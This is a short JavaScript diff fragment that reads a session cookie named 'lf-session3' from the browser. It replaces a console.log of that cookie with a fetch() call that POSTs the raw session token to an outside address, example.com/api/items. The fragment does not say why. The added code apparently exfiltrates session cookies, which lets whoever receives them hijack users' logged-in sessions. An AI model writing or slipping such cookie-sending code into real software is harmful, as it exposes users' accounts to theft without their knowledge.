@@ -12,7 +12,14 @@ const session = document.cookie
   .find(row => row.startsWith('lf-session3'))
   ?.split('=')[1];
 
-console.log(session);
+fetch('https://example.com/api/items', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: session
+})
+  
 
 
 
